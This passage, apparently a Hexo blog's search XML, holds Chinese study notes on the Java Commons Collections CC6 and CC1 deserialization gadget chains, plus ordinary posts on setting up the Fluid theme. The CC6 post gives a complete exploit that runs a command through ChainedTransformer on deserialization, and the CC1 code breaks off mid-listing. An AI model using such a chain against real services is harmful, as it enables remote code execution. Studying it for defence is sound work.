      <link href="/2025/03/26/Java-CC6/"/>
      <url>/2025/03/26/Java-CC6/</url>
      
        <content type="html"><![CDATA[<p>CC6不受jdk版本约束</p><p>CC6 &#x3D; CC1 + URLDNS</p><p>前半还是LazyMap.get() &#x3D;&gt; ChainedTransformer.transform()</p><p>直接使用 <code>ChainedTransformer</code>可以解决<code>Runtime</code>类不能反序列化的问题，配合<code>ConstantTransformer</code>类，又可以解决参数传递的问题。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>           (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode()); <br>&#125;<br></code></pre></td></tr></table></figure><p><code>java.util.HashMap</code></p><p><code>readObject()</code>部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>    putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>       <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>   &#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>       <span class="hljs-type">int</span> h;<br>       <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h3><p>可以弹计算器，但是有个问题，在 <code>HashMap</code>初始化后，我们往hashMap中存入键值对时，会触发链子。但是此时我们并没有序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span>  LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>        HashMap&lt;TiedMapEntry,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;value&quot;</span>);<br><br><span class="hljs-comment">//        serializable(hashMap);</span><br><span class="hljs-comment">//        unserializable(&quot;ser.bin&quot;);</span><br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="小bug"><a href="#小bug" class="headerlink" title="小bug"></a>小bug</h4><p>在调试时，在14行就会触发链子。</p><p>因为在 IDEA 进行 debug 调试的时候，为了展示对象的集合，会自动调用 <code>toString()</code> 方法，所以在创建 <code>TiedMapEntry</code> 的时候，就提前调用了 <code>getValue()</code> 最终将链子走完，然后弹出计算器。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">getKey</span>() + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-title function_">getValue</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>修改设置，可解决</p><p><img src="/image/image-20250325213318726.png" alt="image-20250325213318726"></p><p>无伤大雅，继续我们的问题。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>我们需要将在初始化 <code>HashMap</code>的时候，传入的<code>Transformer</code>不是我们执行的 <code>Runtime.getRuntime().exec()</code>，之后修改 <code>lazymap</code>的属性。但是这样我还不确定能不能行。先试一试吧。</p><h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><p>其实这个还不能触发，需要把注释去掉，注释掉那一步，是为了分析为什么需要那一步。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        ConstantTransformer  constantTransformer= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;123&quot;</span>);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span>  LazyMap.decorate(map, constantTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>        HashMap&lt;TiedMapEntry,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;value&quot;</span>);<br><span class="hljs-comment">//        map.remove(&quot;key&quot;);</span><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">fieldfactory</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        fieldfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        fieldfactory.set(lazymap,chainedTransformer);<br><br>        serializable(hashMap);<br>        unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>记得先修复那个小bug，避免影响结果。</p><p>在 <code>LazyMap</code>类<code>get</code>方法打断点。</p><p><img src="/image/image-20250325214129078.png" alt="image-20250325214129078"></p><p>step over（F8），调试过程中逐行执行代码</p><p><img src="/image/image-20250325214353214.png" alt="image-20250325214353214"></p><p>之前的代码，也就是下面这行的代码，传入的key也就是字符串”key”，通过链子的传递来到<code>LazyMap.get()</code>方法。并且在进行if判断时，获取了 <code>ConstantTransformer  constantTransformer= new ConstantTransformer(&quot;123&quot;);</code>调用<code>transform()</code>方法的值，赋值给了map[“key”]使得map[“key”] &#x3D; 123，所有在下次反序列化时调用时 <code>map.containsKey(key) == true</code>，键值对存在了，不会触发 <code>Object value = factory.transform(key);</code>；后面的链子也就失效了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;key&quot;</span>);<br></code></pre></td></tr></table></figure><p>所以我们需要删除掉之前的key。</p><h3 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">HashMap<span class="hljs-selector-class">.readObject</span>()<br>HashMap<span class="hljs-selector-class">.hash</span>(Object key)<br>key<span class="hljs-selector-class">.hashCode</span>()<br><br>TiedMapEntry<span class="hljs-selector-class">.hashCode</span>() =&gt;<br>TiedMapEntry<span class="hljs-selector-class">.getValue</span>() =&gt; <br>LazyMap<span class="hljs-selector-class">.get</span>() =&gt; <br>ChainedTransformer<span class="hljs-selector-class">.transform</span>()<br></code></pre></td></tr></table></figure><p>由于 CC6 <strong>不依赖</strong> <code>sun.reflect</code> 或其他受 JDK 版本变更影响的类，因此 JDK 的升级不会直接影响 CC6 的执行。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-theme-fluid的使用</title>
      <link href="/2025/03/26/hexo-theme-fluid%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2025/03/26/hexo-theme-fluid%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>官方文档：<a href="https://fluid-dev.github.io/hexo-fluid-docs/start/">https://fluid-dev.github.io/hexo-fluid-docs/start/</a></p><h3 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h3><p>这个功能需要配合一些第三方的api，因为是使用的github-page，所以就全套了，使用的是<code>gitalk</code>。</p><p>gitalk是基于issue的，先建立一个存储库，我建的是一个新库，记得public</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">gitalk-comments</span><br></code></pre></td></tr></table></figure><p>访问：<a href="https://github.com/settings/developers">https://github.com/settings/developers</a></p><p>自己在设置寻找比较麻烦，新建</p><p><img src="/image/2.png" alt="img"></p><p>xxxxx是你的github名字</p><p><img src="/image/image-20250326231945393.png" alt="image-20250326231945393"></p><p>点击 <code>Generate a new client secret</code>生成</p><p>复制id，和生成的secret。</p><p>安装主体</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">npm <span class="hljs-selector-tag">i</span> <span class="hljs-attr">--save</span> gitalk<br></code></pre></td></tr></table></figure><p>修改配置文件，输入之前复制的id和secret</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">comments:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">gitalk</span><br>  <br>  <span class="hljs-attr">gitalk:</span> <span class="hljs-comment">#这部分在下面一点，不用直接复制</span><br>    <span class="hljs-attr">clientID:</span> <br>    <span class="hljs-attr">clientSecret:</span> <br>    <span class="hljs-attr">repo:</span> <span class="hljs-string">github_name.github.io</span><br>    <span class="hljs-attr">owner:</span> <span class="hljs-string">github_name</span><br>    <span class="hljs-attr">admin:</span> <span class="hljs-string">github_name</span><br>    <span class="hljs-attr">language:</span> <span class="hljs-string">zh-CN</span><br>    <span class="hljs-attr">labels:</span> [<span class="hljs-string">&#x27;Gitalk&#x27;</span>]<br>    <span class="hljs-attr">perPage:</span> <span class="hljs-number">10</span><br>    <span class="hljs-attr">pagerDirection:</span> <span class="hljs-string">last</span><br>    <span class="hljs-attr">distractionFreeMode:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">createIssueManually:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">hexo g <span class="hljs-meta">&amp;&amp; hexo d</span><br></code></pre></td></tr></table></figure><p>还需要在文章页底部初始化Issue</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo-theme-fluid的坑</title>
      <link href="/2025/03/26/hexo-theme-fluid%E7%9A%84%E5%9D%91/"/>
      <url>/2025/03/26/hexo-theme-fluid%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>真的是坑哭了，昨天本来先有空整个美美的blog，但是图片加载不出来。</p><p>本地展示<code>hexo s</code> 也是可以的，但只要 <code>hexo d</code>推送，没有任何的报错，仓库里也是有的，但是图片就是404。</p><p>我还找个同样主题的博客看了眼，也是可以的，不是404。</p><p>当时情况是储存图片的位置为<code>/img</code>，这是按照官方文档储存的。我自己有个github图床也是名叫 <code>img</code>，不知道是不是这个原因。</p><p>在自己写的文章的图片也是加载不出来，是这样引用的。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">!<span class="hljs-selector-attr">[]</span>(/<span class="hljs-selector-tag">img</span>/<span class="hljs-number">1</span><span class="hljs-selector-class">.png</span>)<br></code></pre></td></tr></table></figure><p>后面我直接修改文件夹名为image，文章中的图片活了。不是404了。</p><p>后面我直接吧主题的静态资源文件夹名字改了，当时也是有点崩溃了，弄了一个晚上和一下午。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">fluid\<span class="hljs-selector-tag">source</span>\<span class="hljs-selector-tag">img</span><br>改为<br>fluid\<span class="hljs-selector-tag">source</span>\<span class="hljs-selector-tag">image</span><br></code></pre></td></tr></table></figure><p>然后在config文件中也这样修改</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">img</span><br><span class="hljs-operator">=</span><span class="hljs-operator">=</span>&gt;<br>image<br></code></pre></td></tr></table></figure><p>嫌麻烦的话可以使用全部替换，但是，先审查一下有没有其他地方必须是<code>/img</code>，比如说一个链接，这是1056行左右的代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">custom:<br>  enable: false<br>  content: &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在下方留言申请加入我的友链，按如下格式提供信息：<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>博客名：Fluid<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>简介：Fluid 主题官方博客<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>链接：https://hexo.fluid-dev.com<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>图片：https://hexo.fluid-dev.com/img/favicon.png<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2025/03/26/test/"/>
      <url>/2025/03/26/test/</url>
      
        <content type="html"><![CDATA[<p><img src="/image/go.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/03/26/hello-world/"/>
      <url>/2025/03/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h2 id="links"><a href="#links" class="headerlink" title="links"></a>links</h2><p><a href="https://hexo.io/zh-cn/docs/">文档 | Hexo</a></p><p><a href="https://hexo.fluid-dev.com/docs/">Hexo Fluid 用户手册 (fluid-dev.com)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CC1-LazyMap链</title>
      <link href="/2025/03/25/CC1-LazyMap%E9%93%BE/"/>
      <url>/2025/03/25/CC1-LazyMap%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="CC1-LazyMap链"><a href="#CC1-LazyMap链" class="headerlink" title="CC1-LazyMap链"></a>CC1-LazyMap链</h2><p><code>org.apache.commons.collections.map.LazyMap</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要是通过动态代理的思想，来实现链式调用。</p><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>类实现了 <code>InvocationHandler, Serializable</code>接口，我们可以把它作为一个动态代理类，当被代理的对象调用方法时，则会调用<code>Invoke</code>方法。</p><p><code>readObject()</code>方法中，<code>entrySet()</code>则会触发代理</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">for</span> (<span class="hljs-built_in">Map</span>.Entry&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">Object</span>&gt; memberValue : memberValues.entrySet()) &#123;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializable</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>    oos.writeObject(obj);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializable</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path));<br>    <span class="hljs-keyword">return</span> ois.readObject();<br>&#125;<br><br><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test3</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> <span 